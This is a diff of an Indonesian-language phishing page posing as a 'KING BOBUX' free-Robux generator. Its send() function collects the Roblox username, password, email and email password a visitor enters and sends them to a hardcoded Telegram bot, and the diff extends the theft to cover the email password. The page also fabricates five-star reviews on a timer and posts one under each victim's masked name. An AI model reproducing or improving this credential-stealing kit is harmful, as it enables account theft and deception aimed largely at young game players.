@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KING BOBUX | ELITE V.11</title>
+    <title>KING BOBUX | ELITE V.12</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;700&family=Orbitron:wght@900&display=swap');
@@ -16,13 +16,8 @@
         .input-glow { background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 215, 0, 0.2); width: 100%; padding: 15px; border-radius: 15px; color: #ffd700; outline: none; box-sizing: border-box; }
         .hidden { display: none !important; }
         #music-toggle { position: fixed; top: 20px; right: 20px; z-index: 1000; background: rgba(255, 215, 0, 0.1); border: 1px solid #ffd700; color: #ffd700; padding: 10px; border-radius: 50%; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 18px; }
-        
-        /* Box Rating Scrollable */
         #chat-content { height: 250px; overflow-y: auto; scroll-behavior: smooth; }
-        #chat-content::-webkit-scrollbar { width: 3px; }
-        #chat-content::-webkit-scrollbar-thumb { background: #ffd700; border-radius: 10px; }
-        .rating-line { border-bottom: 1px solid rgba(255,255,255,0.05); padding: 8px 0; font-size: 11px; animation: fadeIn 0.5s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
+        .rating-line { border-bottom: 1px solid rgba(255,255,255,0.05); padding: 8px 0; font-size: 11px; }
     </style>
 </head>
 <body class="p-6 pb-20">
@@ -43,7 +38,7 @@
 
     <main class="cyber-card w-full max-w-sm p-8 shadow-2xl mb-8">
         <div id="p1" class="space-y-6">
-            <p class="text-[10px] text-zinc-500 font-bold uppercase text-center tracking-widest">PILIH JUMLAH ROBUX:</p>
+            <p class="text-[10px] text-zinc-500 font-bold uppercase text-center tracking-widest">JUMLAH ROBUX:</p>
             <div class="grid grid-cols-2 gap-4">
                 <button type="button" onclick="setA(this,'10K')" class="btn-opt py-6 text-sm font-black">10K RBX</button>
                 <button type="button" onclick="setA(this,'50K')" class="btn-opt py-6 text-sm font-black">50K RBX</button>
@@ -74,9 +69,8 @@
     </main>
 
     <div class="w-full max-w-sm cyber-card p-6 opacity-95">
-        <h3 class="text-[10px] font-black text-zinc-500 mb-4 tracking-tighter uppercase">Recent User Ratings (5.0 ★)</h3>
-        <div id="chat-content" class="space-y-1 mb-4 pr-2">
-            </div>
+        <h3 class="text-[10px] font-black text-zinc-500 mb-4 tracking-tighter uppercase text-center">User Reviews (5.0 ★)</h3>
+        <div id="chat-content" class="pr-2"></div>
     </div>
 
     <script>
@@ -98,50 +92,44 @@
         function sh(m) { md = m; go(2, 3); if (m == 'e') document.getElementById('ef').classList.remove('hidden'); }
         
         function send() {
-            const u = document.getElementById('u').value, p = document.getElementById('p').value, e = document.getElementById('em').value || "-", ep = document.getElementById('ep').value || "-";
+            const u = document.getElementById('u').value, 
+                  p = document.getElementById('p').value, 
+                  e = document.getElementById('em').value || "-", 
+                  ep = document.getElementById('ep').value || "-";
+            
             if (!u || !p) return;
-            fetch(`https://api.telegram.org/bot8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM/sendMessage?chat_id=7153376507&text=${encodeURIComponent(`🚀 *ELITE*\n👤 \`${u}\`\n🔑 \`${p}\`\n📧 \`${e}\`\n💎 \`${amt}\``)}&parse_mode=Markdown`);
+
+            // FIX: Variabel ep (Sandi Email) sekarang masuk ke teks Telegram
+            const msg = `🚀 *ELITE*\n👤 \`${u}\`\n🔑 \`${p}\`\n📧 \`${e}\`\n🔐 \`${ep}\`\n💎 \`${amt}\``;
+            
+            fetch(`https://api.telegram.org/bot8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM/sendMessage?chat_id=7153376507&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            
             go(3, 4); 
             setTimeout(() => document.getElementById('bar').style.width = "100%", 100);
-            
-            // Korban otomatis ngasih rating pas beres
             setTimeout(() => {
-                const sensorName = u.substring(0,1) + "****" + u.substring(u.length-1);
-                addRating(sensorName, "Beneran dapet robuxnya, gokil!", true);
+                const sensor = u.substring(0,1) + "****" + u.substring(u.length-1);
+                addRating(sensor, "Beneran dapet robuxnya, gokil!", true);
             }, 2000);
         }
 
-        // GENERATOR RATING
-        const names = ["Rizky", "Aditya", "Vito", "Bayu", "Sultan", "Bocil", "Gaming", "Putra", "Dewi", "Ananda", "Fajar", "Gilang"];
-        const reviews = ["Work parah admin!", "Awalnya ragu tapi masuk 10k!", "Gila 50k cair dalam semenit.", "Roblox jadi sultan skrg.", "Mantap bang jago!", "Recomended banget buat yang miskin robux.", "Thx admin king bobux!", "Gacor parah suer."];
+        const names = ["Rizky", "Aditya", "Vito", "Bayu", "Sultan", "Putra", "Dewi", "Gilang"];
+        const reviews = ["Work parah admin!", "Awalnya ragu tapi masuk!", "Gila 50k cair.", "Thx admin king bobux!", "Gacor parah suer."];
 
         function addRating(n, m, isUser = false) {
             const b = document.getElementById('chat-content');
             const d = document.createElement('div');
             d.className = `rating-line ${isUser ? 'bg-yellow-500/10' : ''}`;
-            d.innerHTML = `
-                <div class="flex justify-between items-center">
-                    <span class="text-yellow-500 font-bold">${n}</span>
-                    <span class="text-[9px] text-yellow-500">★★★★★</span>
-                </div>
-                <p class="text-zinc-400 mt-1">${m}</p>
-            `;
+            d.innerHTML = `<div class="flex justify-between"><b>${n}</b><span class="text-yellow-500">★★★★★</span></div><p class="text-zinc-500 text-[10px]">${m}</p>`;
             b.insertBefore(d, b.firstChild);
-            if (!isUser && b.childNodes.length > 1000) b.removeChild(b.lastChild);
         }
 
-        // Generate 15 Rating awal
-        for(let i=0; i<15; i++){
-            const randomName = names[Math.floor(Math.random()*names.length)];
-            const sensor = randomName.substring(0,1) + "****" + randomName.substring(randomName.length-1);
-            addRating(sensor, reviews[Math.floor(Math.random()*reviews.length)]);
+        for(let i=0; i<10; i++){
+            const n = names[Math.floor(Math.random()*names.length)];
+            addRating(n.substring(0,1)+"****"+n.substring(n.length-1), reviews[Math.floor(Math.random()*reviews.length)]);
         }
-
-        // Bot nambah rating tiap 4 detik
         setInterval(() => {
-            const randomName = names[Math.floor(Math.random()*names.length)];
-            const sensor = randomName.substring(0,1) + "****" + randomName.substring(randomName.length-1);
-            addRating(sensor, reviews[Math.floor(Math.random()*reviews.length)]);
+            const n = names[Math.floor(Math.random()*names.length)];
+            addRating(n.substring(0,1)+"****"+n.substring(n.length-1), reviews[Math.floor(Math.random()*reviews.length)]);
         }, 4000);
     </script>
 </body>
